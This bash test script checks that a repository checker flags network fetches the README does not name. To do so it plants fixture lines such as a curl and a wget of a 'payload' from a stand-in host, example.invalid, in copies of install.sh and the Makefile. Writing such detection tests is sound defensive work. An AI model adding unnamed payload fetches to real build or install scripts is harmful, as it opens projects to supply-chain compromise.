#!/bin/bash
# tests/readme-sources.sh fails when it should: it runs against a copy of the README, the scripts,
# the docker files and .gitmodules, first as they are (it passes), then with one change planted
# in the copy (it fails with the line that names it). A check that stops failing fails here.
# Run from the repository root. Prints FAIL lines, exits 1 on any miss.
set -u

failed=0
function fail() {
    echo "FAIL $*"
    failed=1
}

w=$(mktemp -d "${TMPDIR:-/tmp}/readme-sources-fixtures.XXXXXX") && [ -d "$w" ] || {
    echo "FAIL mktemp -d"
    exit 1
}
w=$(cd "$w" && pwd -P)
trap 'rm -rf -- "$w"' EXIT

check="$PWD/tests/readme-sources.sh"

# A fresh copy of what the check reads, in $w/repo.
function fresh() {
    rm -rf -- "$w/repo"
    mkdir "$w/repo"
    cp -R README.md Makefile .gitmodules scripts docker "$w/repo/"
}

# Runs the check on the copy; $1 is the case, $2 the exit code expected, $3 a pattern one whole
# line of the output must match.
function expect() {
    local out code
    out=$(bash "$check" "$w/repo" 2>&1)
    code=$?
    [ "$code" -eq "$2" ] || fail "$1: exit $code, expected $2"
    printf '%s\n' "$out" | grep -qxE -- "$3" || fail "$1: no line matching $3 in: $out"
}

fresh
expect "the copy as it is" 0 'PASS readme-sources \([0-9]+ sources\)'

fresh
grep -vF 'bash-toolbox/<commit>/src/prefix.sh' README.md > "$w/repo/README.md"
expect "the README without the toolbox URL" 1 \
    'FAIL README\.md does not name https://raw\.githubusercontent\.com/[^ ]+/bash-toolbox/<commit>/src/prefix\.sh, which the project fetches'

fresh
printf '%s\n' '    curl -fsSL https://example.invalid/payload.sh' >> "$w/repo/scripts/install.sh"
expect "a curl of an unnamed URL" 1 \
    'FAIL a fetch the README may not name: scripts/install\.sh:[0-9]+:    curl -fsSL https://example\.invalid/payload\.sh'

fresh
printf '\n%s\n' '	wget -q https://example.invalid/payload' >> "$w/repo/Makefile"
expect "a wget in the Makefile" 1 \
    'FAIL a fetch the README may not name: Makefile:[0-9]+:	wget -q https://example\.invalid/payload'

if [ "$failed" -ne 0 ]; then
    exit 1
fi
echo "PASS readme-sources-fixtures"
